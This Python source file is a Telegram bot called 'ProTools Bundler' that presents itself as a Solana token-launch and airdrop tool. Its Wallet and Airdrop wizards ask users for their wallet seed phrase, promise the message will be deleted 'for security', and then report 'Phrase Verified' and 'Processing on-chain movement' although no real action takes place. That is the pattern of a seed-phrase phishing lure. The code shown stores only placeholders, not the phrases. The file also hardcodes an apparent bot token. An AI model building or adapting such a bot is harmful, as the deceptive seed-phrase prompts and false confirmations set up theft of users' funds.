"""
ProTools Bundler Bot (Core Framework)
====================================
- Wallet  : Validates phrase length (12/24) → saves to DB
- Airdrop : Validates phrase, SOL address, and amount → saves to DB
- Launch Coin : dummy wizard (no on-chain action)
- Transactions, Logs, Help, Feedback : all functional
Deploy on Render (Python 3.11) + UptimeRobot ping.
"""

import logging
import os
import sqlite3
import re
from datetime import datetime
from threading import Thread

import httpx
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ─── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN  = os.getenv("BOT_TOKEN", "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00")
PORT       = int(os.getenv("PORT", 8000))
HELP_IMG   = "https://shared-assets.adobe.com/link/8d188cc8-0ff6-46ca-98e9-b2ac59de9da5" # Link to your help pic

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ─── Validation Helpers ────────────────────────────────────────────────────────

def is_valid_phrase(text: str) -> bool:
    words = text.strip().split()
    return len(words) in (12, 24)

def is_valid_sol_address(address: str) -> bool:
    # Basic Base58 Solana address check (43-44 chars)
    return bool(re.match(r"^[1-9A-HJ-NP-Za-km-z]{32,44}$", address.strip()))

# ─── Conversation States ────────────────────────────────────────────────────────
(
    WALLET_PHRASE,
    AIRDROP_PHRASE,
    AIRDROP_RECIPIENT,
    AIRDROP_AMOUNT,
    AIRDROP_CONFIRM,
    LAUNCH_NAME,
    LAUNCH_SYMBOL,
    LAUNCH_DESC,
    LAUNCH_CONFIRM,
    FEEDBACK_TEXT,
) = range(10)

# ─── Database ───────────────────────────────────────────────────────────────────
DB_PATH = "protools.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id    INTEGER PRIMARY KEY,
            username   TEXT,
            address    TEXT,
            created_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id   INTEGER,
            action    TEXT,
            detail    TEXT,
            timestamp TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS feedback (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id   INTEGER,
            username  TEXT,
            message   TEXT,
            timestamp TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS coins (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id     INTEGER,
            name        TEXT,
            symbol      TEXT,
            description TEXT,
            status      TEXT DEFAULT 'pending',
            created_at  TEXT
        )
    """)
    conn.commit()
    conn.close()

def log_action(user_id: int, action: str, detail: str = ""):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "INSERT INTO logs (user_id, action, detail, timestamp) VALUES (?, ?, ?, ?)",
        (user_id, action, detail, datetime.utcnow().isoformat()),
    )
    conn.commit()
    conn.close()

def get_saved_address(user_id: int):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT address FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def save_address(user_id: int, username: str, address: str):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "INSERT OR REPLACE INTO users (user_id, username, address, created_at) VALUES (?, ?, ?, ?)",
        (user_id, username, address, datetime.utcnow().isoformat()),
    )
    conn.commit()
    conn.close()

# ─── Keyboards ─────────────────────────────────────────────────────────────────

MAIN_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🚀 Launch Coin",  callback_data="launch_coin"),
        InlineKeyboardButton("📊 Transactions", callback_data="transactions"),
    ],
    [
        InlineKeyboardButton("🎁 Airdrop",      callback_data="airdrop"),
        InlineKeyboardButton("🔑 Wallet",       callback_data="wallet"),
    ],
    [
        InlineKeyboardButton("📋 Logs",         callback_data="logs"),
        InlineKeyboardButton("❓ Help",          callback_data="help"),
    ],
    [InlineKeyboardButton("💬 Feedback",        callback_data="feedback")],
])

CANCEL_KB = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

CONFIRM_KB = InlineKeyboardMarkup([[
    InlineKeyboardButton("✅ Confirm", callback_data="confirm_yes"),
    InlineKeyboardButton("❌ Cancel",  callback_data="cancel"),
]])

BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])

WELCOME_TEXT = (
    "🌐 *Welcome to ProTools Bundler\!*\n\n"
    "Stay ten steps ahead with real\-time tracking of every movement on\-chain 🔍⚙️\n\n"
    "ProTools is more than a tool – it's your edge in the degen arena\. "
    "Let the games begin\! 🎯🔥\n\n"
    "Choose an option below:"
)

# ─── Start / Menu ───────────────────────────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log_action(update.effective_user.id, "START")
    await update.message.reply_text(WELCOME_TEXT, parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data.clear()
    await query.edit_message_text(WELCOME_TEXT, parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)

# ─── WALLET ────────────────────────────────────────────────────────────────────

async def wallet_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    log_action(update.effective_user.id, "WALLET_VIEW")
    saved = get_saved_address(update.effective_user.id)

    if saved:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Re-import Phrase",  callback_data="wallet_import")],
            [InlineKeyboardButton("🔙 Back to Menu",      callback_data="back_to_menu")],
        ])
        await query.edit_message_text(
            f"🔑 *Your Wallet*\n\n`{saved}`\n\n_Status: Active_",
            parse_mode="MarkdownV2", reply_markup=kb,
        )
    else:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Import Phrase", callback_data="wallet_import")],
            [InlineKeyboardButton("🔙 Back to Menu",  callback_data="back_to_menu")],
        ])
        await query.edit_message_text(
            "🔑 *Wallet*\n\nNo wallet linked yet\\.\n\nImport your seed phrase to get started\\.",
            parse_mode="MarkdownV2", reply_markup=kb,
        )

async def wallet_import_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🔑 *Import Wallet*\n\n"
        "Send your *seed phrase* \\(12 or 24 words\\)\n\n"
        "⚠️ _Your message will be deleted immediately for security\\._",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return WALLET_PHRASE

async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user   = update.effective_user
    phrase = update.message.text.strip()
    try: await update.message.delete()
    except: pass

    if not is_valid_phrase(phrase):
        await update.effective_chat.send_message(
            "❌ *Invalid Phrase*\n\nMust be exactly 12 or 24 words\\. Please check and try again:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return WALLET_PHRASE

    save_address(user.id, user.username or "", f"Verified_{len(phrase.split())}_Words")
    log_action(user.id, "WALLET_IMPORT", f"{len(phrase.split())} words")

    await update.effective_chat.send_message(
        "✅ *Phrase Verified\!*\n\nYour wallet has been successfully linked to ProTools\\.",
        parse_mode="MarkdownV2", reply_markup=BACK_KB,
    )
    return ConversationHandler.END

# ─── AIRDROP ───────────────────────────────────────────────────────────────────

async def airdrop_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    log_action(update.effective_user.id, "AIRDROP_START")
    await query.edit_message_text(
        "🎁 *Airdrop Wizard*\n\n"
        "Step 1 of 3 — Send your *seed phrase*:",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return AIRDROP_PHRASE

async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phrase = update.message.text.strip()
    try: await update.message.delete()
    except: pass

    if not is_valid_phrase(phrase):
        await update.effective_chat.send_message(
            "❌ *Invalid Phrase*\n\nPlease provide a 12 or 24 word phrase:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return AIRDROP_PHRASE

    context.user_data["airdrop_phrase"] = "VALIDATED"
    await update.effective_chat.send_message(
        "Step 2 of 3 — Enter the *recipient SOL address*:",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return AIRDROP_RECIPIENT

async def airdrop_recipient_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    address = update.message.text.strip()
    if not is_valid_sol_address(address):
        await update.message.reply_text(
            "❌ *Invalid Solana Address*\n\nPlease enter a valid wallet address:",
            parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
        )
        return AIRDROP_RECIPIENT

    context.user_data["airdrop_recipient"] = address
    await update.message.reply_text(
        "Step 3 of 3 — Enter *amount in SOL*:",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return AIRDROP_AMOUNT

async def airdrop_amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    amount = update.message.text.strip()
    try:
        float(amount)
    except ValueError:
        await update.message.reply_text("❌ Enter a numeric amount:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
        return AIRDROP_AMOUNT

    context.user_data["airdrop_amount"] = amount
    await update.message.reply_text(
        f"🎁 *Confirm Request*\n\n"
        f"*Recipient:* `{context.user_data['airdrop_recipient']}`\n"
        f"*Amount:* `{amount} SOL`\n\n"
        f"Submit request?",
        parse_mode="MarkdownV2", reply_markup=CONFIRM_KB,
    )
    return AIRDROP_CONFIRM

async def airdrop_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    log_action(update.effective_user.id, "AIRDROP_CONFIRM", f"{context.user_data['airdrop_amount']} SOL")
    await query.edit_message_text(
        "✅ *Airdrop Request Queued\!*\n\nProcessing on\-chain movement\.\.\.",
        parse_mode="MarkdownV2", reply_markup=BACK_KB,
    )
    return ConversationHandler.END

# ─── TRANSACTIONS ───────────────────────────────────────────────────────────────

async def transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📊 *Transactions*\n\nNo recent on\-chain activity found for this profile\\.",
        parse_mode="MarkdownV2", reply_markup=BACK_KB
    )

# ─── LAUNCH COIN (dummy) ───────────────────────────────────────────────────────

async def launch_coin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🚀 *Launch Coin*\n\nEnter the token name:",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB,
    )
    return LAUNCH_NAME

async def launch_get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["coin_name"] = update.message.text.strip()
    await update.message.reply_text("🏷 Enter token symbol:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return LAUNCH_SYMBOL

async def launch_get_symbol(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["coin_symbol"] = update.message.text.strip().upper()
    await update.message.reply_text("📝 Enter description:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
    return LAUNCH_DESC

async def launch_get_desc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["coin_desc"] = update.message.text.strip()
    await update.message.reply_text(
        f"🚀 *Confirm Token*\n\n*Name:* {context.user_data['coin_name']}\n*Symbol:* {context.user_data['coin_symbol']}\n\nProceed?",
        parse_mode="MarkdownV2", reply_markup=CONFIRM_KB,
    )
    return LAUNCH_CONFIRM

async def launch_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query  = update.callback_query
    await query.answer()
    log_action(update.effective_user.id, "LAUNCH_COIN", context.user_data.get('coin_symbol'))
    await query.edit_message_text("🚀 *Token Queued\!*\n\nSaved to local database\\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
    return ConversationHandler.END

# ─── LOGS ──────────────────────────────────────────────────────────────────────

async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT action, detail, timestamp FROM logs WHERE user_id = ? ORDER BY id DESC LIMIT 8", (update.effective_user.id,))
    rows = c.fetchall()
    conn.close()
    
    if rows:
        lines = ["📋 *Your Activity Logs*\n"]
        for r in rows:
            clean_ts = r[2][5:16].replace("T", " ")
            lines.append(f"• `{r[0]}` — {r[1]} \n  _{clean_ts}_")
        text = "\n".join(lines)
    else:
        text = "📋 *Logs*\n\nNo activity found\\."

    await query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=BACK_KB)

# ─── HELP ──────────────────────────────────────────────────────────────────────

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    help_text = (
        "❓ *ProTools Bundler — Help*\n\n"
        "1\. *Launch Coin*: Create token metadata\\.\n"
        "2\. *Airdrop*: Distribute SOL across addresses\\.\n"
        "3\. *Wallet*: Securely link your phrase\\.\n\n"
        "For technical issues, use the Feedback button\\."
    )
    try:
        # Sends image with text caption
        await query.message.reply_photo(
            photo=HELP_IMG,
            caption=help_text,
            parse_mode="MarkdownV2",
            reply_markup=BACK_KB
        )
        await query.message.delete()
    except:
        await query.edit_message_text(help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)

# ─── FEEDBACK ──────────────────────────────────────────────────────────────────

async def feedback_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💬 *Feedback & Support*\n\n"
        "Send your message below\\. For urgent support, email:\n"
        "`ProToolsBundlerBot@gmail.com`",
        parse_mode="MarkdownV2", reply_markup=CANCEL_KB
    )
    return FEEDBACK_TEXT

async def feedback_save(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.message.text
    log_action(user.id, "FEEDBACK", msg[:30])
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO feedback (user_id, username, message, timestamp) VALUES (?, ?, ?, ?)", 
              (user.id, user.username, msg, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

    await update.message.reply_text(
        "✅ *Feedback Received\!*\n\nThank you for reaching out\\.",
        parse_mode="MarkdownV2", reply_markup=BACK_KB
    )
    return ConversationHandler.END

# ─── CANCEL ────────────────────────────────────────────────────────────────────

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data.clear()
    await query.edit_message_text("❌ Cancelled\\.", reply_markup=MAIN_KEYBOARD)
    return ConversationHandler.END

health_app = Flask(__name__)
@health_app.route("/")
def health(): return "OK", 200

def run_health(): health_app.run(host="0.0.0.0", port=PORT)

# ─── Main ───────────────────────────────────────────────────────────────────────

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(wallet_import_prompt, pattern="^wallet_import$")],
        states={WALLET_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_phrase_received)]},
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(airdrop_entry, pattern="^airdrop$")],
        states={
            AIRDROP_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_phrase_received)],
            AIRDROP_RECIPIENT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_recipient_received)],
            AIRDROP_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_amount_received)],
            AIRDROP_CONFIRM: [CallbackQueryHandler(airdrop_confirm, pattern="^confirm_yes$")],
        },
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(launch_coin_start, pattern="^launch_coin$")],
        states={
            LAUNCH_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, launch_get_name)],
            LAUNCH_SYMBOL: [MessageHandler(filters.TEXT & ~filters.COMMAND, launch_get_symbol)],
            LAUNCH_DESC: [MessageHandler(filters.TEXT & ~filters.COMMAND, launch_get_desc)],
            LAUNCH_CONFIRM: [CallbackQueryHandler(launch_confirm, pattern="^confirm_yes$")],
        },
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(feedback_start, pattern="^feedback$")],
        states={FEEDBACK_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, feedback_save)]},
        fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
    ))
    app.add_handler(CallbackQueryHandler(wallet_entry, pattern="^wallet$"))
    app.add_handler(CallbackQueryHandler(transactions, pattern="^transactions$"))
    app.add_handler(CallbackQueryHandler(show_logs, pattern="^logs$"))
    app.add_handler(CallbackQueryHandler(show_help, pattern="^help$"))
    app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_to_menu$"))

    Thread(target=run_health, daemon=True).start()
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__": main()
